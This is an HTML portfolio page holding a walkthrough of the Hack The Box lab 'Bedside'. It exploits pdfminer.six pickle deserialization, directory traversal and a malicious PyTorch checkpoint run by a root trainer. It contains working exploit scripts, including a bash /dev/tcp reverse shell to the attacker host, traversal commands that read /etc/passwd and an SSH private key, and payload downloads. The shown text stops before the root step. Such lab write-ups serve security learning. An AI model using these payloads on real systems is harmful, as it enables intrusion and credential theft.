@@ -1,0 +1,1476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bedside &mdash; HTB Writeup | Joseph Devasia</title>
+  <meta name="description" content="Hack The Box — Bedside (Medium, Linux). Full chain to root: pdfminer.six pickle deserialization RCE, directory traversal for lateral movement, and a malicious PyTorch checkpoint loaded by a root MONAI trainer for privilege escalation." />
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23080c10'/%3E%3Cpath d='M32 6 L54 14 L54 34 C54 48 44 57 32 62 C20 57 10 48 10 34 L10 14 Z' fill='none' stroke='%2300ff41' stroke-width='2'/%3E%3Ctext x='32' y='40' font-family='Arial Black,sans-serif' font-weight='900' font-size='18' fill='%2300ff41' text-anchor='middle'%3EJD%3C/text%3E%3C/svg%3E" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --green:  #00ff41;
+      --cyan:   #00d4ff;
+      --purple: #7b2fff;
+      --amber:  #ffb300;
+      --red:    #ff5a5a;
+      --bg:     #080c10;
+      --bg2:    #0d1117;
+      --bg3:    #111827;
+      --card:   rgba(255,255,255,0.04);
+      --border: rgba(0,255,65,0.18);
+      --text:   #c9d1d9;
+      --muted:  #586069;
+    }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      line-height: 1.75;
+      overflow-x: hidden;
+    }
+    a { color: var(--cyan); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    ::selection { background: var(--green); color: #000; }
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--green); border-radius: 4px; }
+
+    .bg-grid {
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+      background-image:
+        linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      -webkit-mask-image: radial-gradient(ellipse at top, #000 20%, transparent 75%);
+      mask-image: radial-gradient(ellipse at top, #000 20%, transparent 75%);
+    }
+
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 1rem 1.5rem;
+      background: rgba(8,12,16,0.85);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+    }
+    .back-link {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.85rem; color: var(--green);
+      display: inline-flex; align-items: center; gap: 0.5rem;
+    }
+    .back-link:hover { text-decoration: none; opacity: 0.8; }
+    .topbar-logo { font-family: 'Orbitron', monospace; font-weight: 700; color: #fff; font-size: 0.9rem; }
+    .topbar-logo span { color: var(--green); }
+
+    .layout {
+      position: relative; z-index: 1;
+      max-width: 1180px; margin: 0 auto;
+      display: grid; grid-template-columns: 240px 1fr;
+      gap: 2.5rem; padding: 2rem 1.5rem 6rem;
+    }
+    .toc {
+      position: sticky; top: 90px; align-self: start;
+      max-height: calc(100vh - 110px); overflow-y: auto;
+      font-size: 0.82rem;
+      border-left: 1px solid var(--border);
+      padding-left: 1rem;
+    }
+    .toc-title {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.72rem; letter-spacing: 2px; text-transform: uppercase;
+      color: var(--muted); margin-bottom: 0.8rem;
+    }
+    .toc a {
+      display: block; color: var(--muted); padding: 0.28rem 0;
+      border-left: 2px solid transparent; margin-left: -1rem; padding-left: 1rem;
+      transition: color 0.2s, border-color 0.2s;
+      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    }
+    .toc a:hover { color: var(--green); text-decoration: none; }
+    .toc a.active { color: var(--green); border-color: var(--green); }
+
+    article { min-width: 0; }
+    .wu-head { margin-bottom: 2.5rem; }
+    .wu-crumb {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem; color: var(--green); letter-spacing: 2px;
+      text-transform: uppercase; margin-bottom: 1rem;
+    }
+    h1.wu-title {
+      font-family: 'Orbitron', monospace;
+      font-size: clamp(1.8rem, 5vw, 3rem); font-weight: 900;
+      color: #fff; line-height: 1.1; margin-bottom: 1rem;
+    }
+    .wu-badges { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1.5rem; }
+    .badge {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem; letter-spacing: 1px; text-transform: uppercase;
+      padding: 0.25rem 0.7rem; border-radius: 100px;
+    }
+    .badge.htb    { background: rgba(159,239,0,0.1); border: 1px solid rgba(159,239,0,0.4); color: #9fef00; }
+    .badge.medium { background: rgba(255,179,0,0.1); border: 1px solid rgba(255,179,0,0.4); color: var(--amber); }
+    .badge.os     { background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.3); color: var(--cyan); }
+
+    .meta-panel {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 10px; overflow: hidden;
+    }
+    .meta-panel-bar {
+      display: flex; align-items: center; gap: 0.5rem;
+      padding: 0.6rem 1rem; background: rgba(0,0,0,0.3);
+      border-bottom: 1px solid var(--border);
+    }
+    .dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+    .dot.r { background: #ff5f56; } .dot.y { background: #ffbd2e; } .dot.g { background: #27c93f; }
+    .meta-panel-title { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; color: var(--muted); margin-left: 0.5rem; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0 1.5rem; padding: 0.8rem 1.4rem; font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; }
+    .meta-row { padding: 0.4rem 0; display: flex; justify-content: space-between; gap: 1rem; border-bottom: 1px dashed rgba(255,255,255,0.06); }
+    .meta-row .k { color: var(--muted); }
+    .meta-row .v { color: var(--green); text-align: right; }
+
+    /* Rendered markdown */
+    .content h2 {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.5rem; font-weight: 700; color: #fff;
+      margin: 3rem 0 1rem; padding-top: 1.2rem;
+      scroll-margin-top: 90px;
+      border-top: 1px solid rgba(255,255,255,0.06);
+    }
+    .content h3 {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.08rem; font-weight: 700; color: var(--cyan);
+      margin: 2rem 0 0.8rem; scroll-margin-top: 90px;
+    }
+    .content h4 { font-family: 'Share Tech Mono', monospace; color: var(--green); margin: 1.4rem 0 0.6rem; font-size: 0.95rem; }
+    .content p { margin: 0.9rem 0; }
+    .content strong { color: var(--green); font-weight: 600; }
+    .content ul, .content ol { margin: 0.9rem 0 0.9rem 1.5rem; }
+    .content li { margin: 0.4rem 0; }
+    .content hr { border: none; border-top: 1px solid rgba(255,255,255,0.08); margin: 2.5rem 0; }
+
+    .content pre {
+      background: #0a0e13 !important;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin: 1.2rem 0; padding: 0;
+      overflow: hidden;
+      position: relative;
+    }
+    .content pre::before {
+      content: '';
+      display: block; height: 3px;
+      background: linear-gradient(90deg, var(--green), var(--cyan), transparent);
+    }
+    .content pre code {
+      display: block; padding: 1rem 1.1rem; overflow-x: auto;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.82rem; line-height: 1.7;
+      background: transparent !important;
+    }
+    .content :not(pre) > code {
+      font-family: 'Share Tech Mono', monospace; font-size: 0.82em;
+      background: rgba(0,255,65,0.08); color: var(--green);
+      padding: 0.1rem 0.35rem; border-radius: 4px;
+    }
+
+    .content .table-wrap { overflow-x: auto; margin: 1.3rem 0; }
+    .content table {
+      width: 100%; border-collapse: collapse; font-size: 0.86rem;
+      border: 1px solid var(--border); border-radius: 8px; overflow: hidden;
+    }
+    .content th, .content td { padding: 0.65rem 0.9rem; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.06); }
+    .content th {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.72rem; letter-spacing: 1px; text-transform: uppercase;
+      color: var(--green); background: rgba(0,255,65,0.05);
+    }
+    .content td { color: var(--text); vertical-align: top; }
+    .content tr:last-child td { border-bottom: none; }
+
+    .content blockquote {
+      border-left: 3px solid var(--amber);
+      background: rgba(255,179,0,0.06);
+      border-radius: 0 8px 8px 0;
+      padding: 0.6rem 1.1rem; margin: 1.3rem 0;
+      color: #e6c98a; font-style: italic;
+    }
+
+    .foot {
+      margin-top: 3rem; padding-top: 1.5rem;
+      border-top: 1px solid rgba(255,255,255,0.08);
+      font-size: 0.8rem; color: var(--muted);
+      font-family: 'Share Tech Mono', monospace;
+    }
+    .foot a { color: var(--green); }
+    .loading { color: var(--muted); font-family: 'Share Tech Mono', monospace; padding: 2rem 0; }
+
+    @media (max-width: 880px) {
+      .layout { grid-template-columns: 1fr; }
+      .toc { display: none; }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-grid"></div>
+
+  <div class="topbar">
+    <a class="back-link" href="../index.html#writeups">&larr; Back to portfolio</a>
+    <div class="topbar-logo">JD<span>.</span>SEC</div>
+  </div>
+
+  <div class="layout">
+    <nav class="toc" id="toc">
+      <div class="toc-title">Contents</div>
+      <!-- auto-generated -->
+    </nav>
+
+    <article>
+      <header class="wu-head">
+        <div class="wu-crumb">// hack the box &bull; walkthrough</div>
+        <h1 class="wu-title">Bedside</h1>
+        <div class="wu-badges">
+          <span class="badge htb">Hack The Box</span>
+          <span class="badge medium">Medium</span>
+          <span class="badge os">Linux / Debian</span>
+        </div>
+        <div class="meta-panel">
+          <div class="meta-panel-bar">
+            <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+            <span class="meta-panel-title">engagement.meta</span>
+          </div>
+          <div class="meta-grid">
+            <div class="meta-row"><span class="k">Difficulty</span><span class="v">Medium</span></div>
+            <div class="meta-row"><span class="k">Operating System</span><span class="v">Linux (Debian)</span></div>
+            <div class="meta-row"><span class="k">Target</span><span class="v">10.129.248.191</span></div>
+            <div class="meta-row"><span class="k">Attacker VPN</span><span class="v">10.10.15.82</span></div>
+            <div class="meta-row"><span class="k">Initial foothold</span><span class="v">datawrangler</span></div>
+            <div class="meta-row"><span class="k">Host user</span><span class="v">developer</span></div>
+            <div class="meta-row"><span class="k">Final result</span><span class="v">root (uid=0)</span></div>
+          </div>
+        </div>
+      </header>
+
+      <div id="content" class="content"><div class="loading">// rendering writeup&hellip;</div></div>
+
+      <div class="foot">
+        <p>Environment: Hack The Box &mdash; Bedside, an authorized educational security lab. Command outputs and exploit examples are specific to this laboratory environment.</p>
+        <p style="margin-top:0.8rem"><a href="../index.html#writeups">&larr; Back to all writeups</a></p>
+      </div>
+    </article>
+  </div>
+
+  <!-- ─── Writeup source (Markdown) ─────────────────────────────── -->
+  <script id="md" type="text/markdown">
+## Executive Summary
+
+Bedside is a Linux Hack The Box machine involving a chain of vulnerabilities across a research document-processing pipeline and an AI model-training system.
+
+The initial foothold was achieved by exploiting insecure deserialization in `pdfminer.six`. An attacker-controlled gzip-compressed pickle was uploaded alongside a crafted PDF whose font encoding referenced the pickle. When a background service parsed the PDF, it deserialized the malicious data, resulting in remote code execution inside a Docker container.
+
+The next stage involved moving from the `datawrangler` container to the `developer` account on the host. The supplied reference walkthrough documents an internal image-viewer service vulnerable to directory traversal, exposing the developer's SSH private key.
+
+Finally, the `developer` account was permitted to execute a Python-based MONAI trainer as root without a password. The trainer loaded checkpoint files from a datastore writable by `datawrangler`. By placing a malicious PyTorch checkpoint in this shared directory and invoking the trainer, arbitrary code executed with root privileges.
+
+The final identity proof returned:
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## 1. Reconnaissance
+
+### 1.1 Port scanning
+
+The investigation begins with identifying exposed services.
+
+```bash
+nmap -sC -sV -p- --min-rate 1000 10.129.248.191
+```
+
+The reference enumeration identified two externally accessible services:
+
+| Port | Service | Details |
+|---|---|---|
+| 22/tcp | SSH | OpenSSH |
+| 80/tcp | HTTP | Apache 2.4.68 |
+
+HTTP was the primary attack surface.
+
+### 1.2 Website enumeration
+
+The primary website was hosted at:
+
+```text
+http://bedside.htb
+```
+
+Add the hostname to Kali's hosts file:
+
+```bash
+echo "10.129.248.191 bedside.htb" | sudo tee -a /etc/hosts
+```
+
+The main website was largely informational and offered few immediately useful input points.
+
+The next step was virtual-host enumeration.
+
+```bash
+ffuf -u http://bedside.htb/ \
+  -H "Host: FUZZ.bedside.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -mc all -fc 301
+```
+
+This identified an additional virtual host:
+
+```text
+research.bedside.htb
+```
+
+Add it to the hosts file:
+
+```bash
+echo "10.129.248.191 research.bedside.htb" | sudo tee -a /etc/hosts
+```
+
+### 1.3 Research portal discovery
+
+The research subdomain hosted a medical research upload portal accepting formats such as PDF, JPEG, PNG, TIFF, BMP and DICOM.
+
+Response-header inspection showed:
+
+```bash
+curl -I http://research.bedside.htb/
+```
+
+An important header was:
+
+```text
+X-Powered-By: pdfminer.six
+```
+
+This suggested the backend was using the Python PDF-processing library `pdfminer.six`.
+
+The upload endpoint was the root of the research virtual host, and the multipart field name was:
+
+```text
+uploadFile
+```
+
+## 2. Investigating the File Upload
+
+### 2.1 Determining accepted formats
+
+Uploading an unsupported file returned a validation error indicating the accepted extensions.
+
+```bash
+curl -s -F "uploadFile=@/etc/hostname" \
+  http://research.bedside.htb/
+```
+
+The server's whitelist included:
+
+```text
+jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip
+```
+
+The presence of `gz` was significant because `pdfminer.six` uses gzip-compressed pickle files to store certain CMap resources.
+
+### 2.2 Discovering the upload directory
+
+A deliberately malformed gzip upload could trigger a MIME-type validation error.
+
+The response disclosed the server-side upload directory:
+
+```text
+/var/www/research.bedside.htb/uploads
+```
+
+This absolute path became essential to the exploit because the crafted PDF needed to reference a specific file on disk.
+
+### 2.3 Initial exploitation hypothesis
+
+The vulnerable processing chain involved `pdfminer.six` and its CMap loading functionality.
+
+The relevant weakness, associated with CVE-2025-64512, allows attacker-controlled PDF font encoding values to influence which CMap data is loaded. In the vulnerable code path, compressed CMap data is ultimately deserialized using Python's `pickle` module.
+
+Python pickle is unsafe when its input is untrusted because deserialization can execute arbitrary Python callables.
+
+The attack therefore required two files:
+
+1. A compressed malicious pickle stored as a `.pickle.gz` file.
+2. A PDF whose `/Encoding` value referenced that pickle's absolute path.
+
+## 3. Initial Foothold — PDFMiner Deserialization
+
+### 3.1 Why two files were required
+
+The research portal stored uploaded files, but the PDF-processing worker specifically searched for files ending in `.pdf`.
+
+Uploading the pickle alone did not cause it to be processed.
+
+Instead, a separate PDF was needed to trigger loading of the malicious CMap data.
+
+The relationship was:
+
+```text
+shell-trigger.pdf
+        |
+        | Font /Encoding reference
+        v
+/var/www/research.bedside.htb/uploads/shell
+        |
+        | pdfminer appends .pickle.gz
+        v
+shell.pickle.gz
+        |
+        | Unsafe pickle deserialization
+        v
+Remote code execution
+```
+
+### 3.2 Generating the exploit files
+
+The following Python script creates a gzip-compressed pickle and a PDF containing a Type0 font with an attacker-controlled CMap reference.
+
+Save as `make_shell.py`:
+
+```python
+#!/usr/bin/env python3
+
+import gzip
+import pickle
+from pathlib import Path
+
+LHOST = "10.10.15.82"
+LPORT = 4444
+
+PICKLE_NAME = "shell.pickle.gz"
+PDF_NAME = "shell-trigger.pdf"
+
+CMAP_PATH = "/var/www/research.bedside.htb/uploads/shell"
+
+
+class ShellPayload:
+    def __reduce__(self):
+        command = (
+            f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
+        )
+
+        code = (
+            "(__import__('subprocess').Popen("
+            "['/bin/bash', '-c', "
+            f"{command!r}], "
+            "stdin=__import__('subprocess').DEVNULL, "
+            "stdout=__import__('subprocess').DEVNULL, "
+            "stderr=__import__('subprocess').DEVNULL, "
+            "start_new_session=True"
+            "), "
+            "{'CODE2CID': {}, 'IS_VERTICAL': False})[1]"
+        )
+
+        return (eval, (code,))
+
+
+with gzip.open(PICKLE_NAME, "wb") as f:
+    pickle.dump(ShellPayload(), f)
+
+print(f"[+] Created {PICKLE_NAME}")
+
+encoding = CMAP_PATH.replace("/", "#2F")
+
+stream = b"BT /F1 12 Tf 100 700 Td <0041> Tj ET\n"
+
+objects = [
+    b"<< /Type /Catalog /Pages 2 0 R >>",
+
+    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+
+    (
+        b"<< /Type /Page /Parent 2 0 R "
+        b"/MediaBox [0 0 612 792] "
+        b"/Resources << /Font << /F1 5 0 R >> >> "
+        b"/Contents 4 0 R >>"
+    ),
+
+    (
+        b"<< /Length %d >>\nstream\n" % len(stream)
+        + stream
+        + b"endstream"
+    ),
+
+    (
+        f"<< /Type /Font /Subtype /Type0 "
+        f"/BaseFont /TestFont "
+        f"/Encoding /{encoding} "
+        f"/DescendantFonts [6 0 R] >>"
+    ).encode(),
+
+    (
+        b"<< /Type /Font /Subtype /CIDFontType2 "
+        b"/BaseFont /TestFont "
+        b"/CIDSystemInfo << "
+        b"/Registry (Adobe) "
+        b"/Ordering (Identity) "
+        b"/Supplement 0 >> "
+        b"/FontDescriptor 7 0 R /DW 1000 >>"
+    ),
+
+    (
+        b"<< /Type /FontDescriptor "
+        b"/FontName /TestFont "
+        b"/Flags 4 "
+        b"/FontBBox [-1000 -1000 1000 1000] "
+        b"/ItalicAngle 0 "
+        b"/Ascent 1000 "
+        b"/Descent -200 "
+        b"/CapHeight 800 "
+        b"/StemV 80 >>"
+    ),
+]
+
+pdf = bytearray(b"%PDF-1.4\n")
+offsets = []
+
+for i, obj in enumerate(objects, 1):
+    offsets.append(len(pdf))
+    pdf += f"{i} 0 obj\n".encode()
+    pdf += obj + b"\nendobj\n"
+
+xref = len(pdf)
+
+pdf += (
+    f"xref\n0 {len(objects) + 1}\n"
+    "0000000000 65535 f \n"
+).encode()
+
+for offset in offsets:
+    pdf += f"{offset:010d} 00000 n \n".encode()
+
+pdf += (
+    f"trailer\n"
+    f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
+    f"startxref\n{xref}\n%%EOF\n"
+).encode()
+
+Path(PDF_NAME).write_bytes(pdf)
+
+print(f"[+] Created {PDF_NAME}")
+print(f"[+] CMap path: {CMAP_PATH}")
+```
+
+Generate the payloads:
+
+```bash
+python3 make_shell.py
+```
+
+Expected files:
+
+```text
+shell.pickle.gz
+shell-trigger.pdf
+```
+
+### 3.3 Uploading the malicious pickle
+
+First, start a reverse-shell listener on Kali:
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+Upload the pickle:
+
+```bash
+curl -sS http://research.bedside.htb/ \
+  -F 'uploadFile=@shell.pickle.gz;type=application/gzip'
+```
+
+Then upload the triggering PDF:
+
+```bash
+curl -sS http://research.bedside.htb/ \
+  -F 'uploadFile=@shell-trigger.pdf;type=application/pdf'
+```
+
+The processing worker polls the uploads directory approximately every 30 seconds.
+
+Once the PDF is processed, the crafted font encoding causes `pdfminer.six` to load the malicious pickle.
+
+### 3.4 Confirming remote command execution
+
+Before establishing the interactive shell, a proof-of-execution payload was used to send the result of the Linux `id` command back to a Kali HTTP listener.
+
+The received request contained:
+
+```text
+GET /?id=uid%3D988%28datawrangler%29%20gid%3D1001%28dataops%29%20groups%3D1001%28dataops%29
+```
+
+Decoded:
+
+```text
+uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
+```
+
+This established that the vulnerable PDF-processing service executed commands as `datawrangler`.
+
+An interactive shell was then obtained under the same account.
+
+## 4. Container Enumeration
+
+The initial shell landed in a container with the following identity:
+
+```bash
+whoami
+id
+hostname
+```
+
+```text
+datawrangler
+uid=988(datawrangler) gid=1001(dataops)
+data-wrangler
+```
+
+The application directory contained:
+
+```text
+/app/
+├── pdf_watcher.py
+└── requirements.txt
+```
+
+The requirements file showed:
+
+```text
+pdfminer.six==20250506
+```
+
+### 4.1 Analyzing the PDF watcher
+
+The application script contained these paths:
+
+```python
+UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
+OUTPUT_DIR = "/datastore/staging"
+```
+
+Its PDF-processing function executed:
+
+```python
+subprocess.run(
+    ["pdf2txt.py", pdf_path, "-o", output_file],
+    timeout=10,
+    check=True
+)
+```
+
+The main loop used:
+
+```python
+pdf_files = glob.glob(os.path.join(UPLOAD_DIR, "*.pdf"))
+```
+
+and:
+
+```python
+SLEEP_INTERVAL = 30
+```
+
+This confirmed three important characteristics:
+
+- Only `.pdf` files were selected for processing.
+- The worker used the vulnerable PDFMiner installation.
+- Extracted output was written into `/datastore/staging`.
+
+### 4.2 Confirming Docker
+
+The file `/.dockerenv` existed:
+
+```bash
+ls -la /.dockerenv
+```
+
+The process namespace showed:
+
+```bash
+cat /proc/1/comm
+tr '\0' ' ' < /proc/1/cmdline
+```
+
+Result:
+
+```text
+python3
+python3 pdf_watcher.py
+```
+
+The shell was therefore operating inside the PDF-processing container.
+
+### 4.3 Shared datastore discovery
+
+Directory enumeration showed:
+
+```text
+/datastore/
+├── checkpoints/
+├── logs/
+├── models/
+├── processed/
+├── raw/
+└── staging/
+```
+
+Permissions were:
+
+```text
+drwxrwx--- datawrangler dataops /datastore
+```
+
+The mount table confirmed that both the datastore and upload directory were backed by filesystem mounts:
+
+```text
+/dev/sda4[/datastore] ... /datastore
+/dev/sda4[/var/www/research.bedside.htb/uploads] ... /var/www/research.bedside.htb/uploads
+```
+
+This shared datastore later became central to the privilege-escalation technique.
+
+## 5. Lateral Movement — Container to Host
+
+> Reconstruction note: This section follows the supplied Bedside reference walkthrough. The shared terminal logs confirm the subsequent `developer@bedside` shell, but do not independently show the commands used to obtain it.
+
+### 5.1 Discovering an internal service
+
+The container's Docker bridge gateway was:
+
+```text
+172.17.0.1
+```
+
+The reference walkthrough used Python socket connections to check common ports:
+
+```python
+import socket
+
+host = "172.17.0.1"
+
+for port in [22, 80, 3000, 5000, 8000, 8080, 9000]:
+    sock = socket.socket()
+    sock.settimeout(0.6)
+
+    if sock.connect_ex((host, port)) == 0:
+        print(f"OPEN: {port}")
+
+    sock.close()
+```
+
+The interesting discovery was:
+
+```text
+OPEN: 3000
+```
+
+Port 3000 hosted an internal Bedside image viewer.
+
+### 5.2 Testing the image viewer
+
+The application presented itself as a medical image viewer.
+
+Its frontend appeared to simulate image-slice data rather than retrieve real medical images from a backend.
+
+However, the underlying web server exposed a separate weakness: directory traversal.
+
+The reference test used:
+
+```bash
+curl --path-as-is \
+  'http://172.17.0.1:3000/../../../../etc/passwd'
+```
+
+The `--path-as-is` option prevents curl from normalizing the `../` components before sending the HTTP request.
+
+The response contained host user accounts, including:
+
+```text
+developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
+```
+
+This demonstrated that the image-viewer server was exposing files beyond its intended web root.
+
+### 5.3 Accessing the developer account
+
+In the reference walkthrough, traversal also exposed the developer's SSH private key:
+
+```bash
+curl --path-as-is \
+  'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'
+```
+
+The recovered key was saved securely on Kali as `dev_key` and assigned restrictive permissions:
+
+```bash
+chmod 600 dev_key
+```
+
+SSH access was then established using:
+
+```bash
+ssh -i dev_key developer@10.129.248.191
+```
+
+The host shell was:
+
+```text
+developer@bedside:~$
+```
+
+### 5.4 Obtaining the user flag
+
+The verified terminal output showed:
+
+```bash
+cd /home/developer
+ls
+```
+
+```text
+projects  user.txt
+```
+
+The user flag was obtained using:
+
+```bash
+cat /home/developer/user.txt
+```
+
+**Result:** User flag obtained successfully. The actual value is omitted from this public write-up.
+
+## 6. Privilege Escalation — Developer to Root
+
+### 6.1 Enumerating sudo privileges
+
+With access to the `developer` account, the next step was:
+
+```bash
+sudo -l
+```
+
+The result showed:
+
+```text
+User developer may run the following commands on bedside:
+
+(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
+```
+
+This was the most important finding in the privilege-escalation stage.
+
+The `developer` account could execute a Python model-training script as root without supplying a password.
+
+Importantly, the sudo rule matched the script invocation without additional script arguments.
+
+### 6.2 Inspecting the privileged trainer
+
+The trainer was located at:
+
+```text
+/opt/trainer/bedside_trainer.py
+```
+
+It used PyTorch and MONAI for an experimental medical-image training pipeline.
+
+Relevant paths were:
+
+```python
+DATASTORE_ROOT = Path("/datastore")
+
+CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
+LOGS_DIR = DATASTORE_ROOT / "logs"
+MODELS_DIR = DATASTORE_ROOT / "models"
+PROCESSED_DIR = DATASTORE_ROOT / "processed"
+RAW_DIR = DATASTORE_ROOT / "raw"
+STAGING_DIR = DATASTORE_ROOT / "staging"
+```
+
+The trainer searched for checkpoint files:
+
+```python
+def find_latest_checkpoint(checkpoint_dir: Path):
+    ckpts = sorted(
+        checkpoint_dir.glob("*.pt"),
+        key=os.path.getmtime
+    )
+    return ckpts[-1] if ckpts else None
+```
+
+If a checkpoint was found, it was passed to MONAI's `CheckpointLoader`:
+
+```python
+latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
+
+if latest_ckpt:
+    loader = CheckpointLoader(
+        load_path=str(latest_ckpt),
+        load_dict={
+            "model": model,
+            "optimizer": optimizer
+        },
+        map_location=DEVICE
+    )
+
+    engine = MockEngine()
+    loader(engine)
+```
+
+The vulnerable behavior was loading an untrusted PyTorch checkpoint through a code path that permitted pickle deserialization.
+
+### 6.3 Understanding the trust boundary
+
+The permissions created an important mismatch.
+
+The host user `developer` could run the trainer as root, but could not directly write to the datastore:
+
+```text
+Permission denied
+```
+
+Meanwhile, the `datawrangler` container account owned the datastore and could write checkpoints.
+
+This gave the attacker a two-account exploitation path:
+
+```text
+datawrangler
+    |
+    | write access
+    v
+/datastore/checkpoints/
+    |
+    | root trainer loads latest .pt
+    v
+Unsafe checkpoint deserialization
+    |
+    v
+Root code execution
+```
+
+### 6.4 Creating a malicious PyTorch checkpoint
+
+A normal PyTorch checkpoint is not simply a raw pickle file. The relevant serialization format uses a ZIP archive containing pickle data.
+
+The following PoC creates a compatible archive structure and embeds a Python object whose `__reduce__()` method executes a command during deserialization.
+
+Save as `build_checkpoint.py` on Kali:
+
+```python
+#!/usr/bin/env python3
+
+"""
+HTB Bedside - PyTorch Checkpoint Deserialization PoC
+
+Target:
+    /opt/trainer/bedside_trainer.py
+
+Vulnerability:
+    CWE-502 - Deserialization of Untrusted Data
+
+Purpose:
+    Confirm root-context command execution in the HTB lab.
+"""
+
+import argparse
+import os
+import pickle
+import zipfile
+
+
+class Payload:
+    def __init__(self, command):
+        self.command = command
+
+    def __reduce__(self):
+        expression = (
+            "(__import__('os').system("
+            f"{self.command!r}"
+            "), {})[1]"
+        )
+
+        return (eval, (expression,))
+
+
+def create_checkpoint(output, command):
+    checkpoint = {
+        "model": Payload(command),
+        "optimizer": {}
+    }
+
+    serialized = pickle.dumps(
+        checkpoint,
+        protocol=2
+    )
+
+    with zipfile.ZipFile(
+        output,
+        "w",
+        zipfile.ZIP_STORED
+    ) as archive:
+
+        archive.writestr(
+            "archive/data.pkl",
+            serialized
+        )
+
+        archive.writestr(
+            "archive/version",
+            "3\n"
+        )
+
+    print(f"[+] Created: {output}")
+    print(f"[+] Size: {os.path.getsize(output)} bytes")
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument(
+        "-o",
+        "--output",
+        default="checkpoint_epoch_99.pt"
+    )
+
+    parser.add_argument(
+        "-c",
+        "--command",
+        default="id > /tmp/bedside-root-proof.txt"
+    )
+
+    args = parser.parse_args()
+
+    create_checkpoint(args.output, args.command)
+```
+
+Generate the initial proof:
+
+```bash
+python3 build_checkpoint.py
+```
+
+Output:
+
+```text
+checkpoint_epoch_99.pt
+```
+
+The embedded command was:
+
+```bash
+id > /tmp/bedside-root-proof.txt
+```
+
+This was designed to establish the execution identity of the process performing deserialization.
+
+### 6.5 Preparing valid model-training data
+
+There was an additional condition in the trainer: it needed valid training data before reaching the checkpoint loader.
+
+If `/datastore/processed/` was empty, the script attempted to promote files from `/datastore/staging/`.
+
+The staging directory contained many generated PDF extraction text files. These were not suitable image-training inputs.
+
+To satisfy the data-loading prerequisite, a small PNG image was created on Kali.
+
+```python
+from PIL import Image
+
+image = Image.new("L", (64, 64), 128)
+image.save("scan.png")
+```
+
+The image and checkpoint could then be transferred through a local HTTP file server.
+
+On Kali:
+
+```bash
+python3 -m http.server 8000
+```
+
+### 6.6 Transferring the files to the shared datastore
+
+The file transfers had to be performed as `datawrangler`, not `developer`.
+
+Inside the existing `datawrangler` container shell:
+
+```bash
+curl -fsS http://10.10.15.82:8000/scan.png \
+  -o /datastore/processed/scan.png
+```
+
+Transfer the checkpoint:
+
+```bash
+curl -fsS http://10.10.15.82:8000/checkpoint_epoch_99.pt \
+  -o /datastore/checkpoints/root.pt
+```
+
+Because the trainer selects the most recently modified `.pt` file, the checkpoint could be made current using:
+
+```bash
+touch /datastore/checkpoints/root.pt
+```
+
+Verify:
+
+```bash
+ls -lh /datastore/processed/scan.png
+ls -lh /datastore/checkpoints/root.pt
+```
+
+The initial attempts to perform these transfers as `developer` failed:
+
+```text
+curl: (23) client returned ERROR on write
+Permission denied
+```
+
+This was expected because `developer` did not have datastore write access.
+
+Using the `datawrangler` account resolved the permissions issue.
+
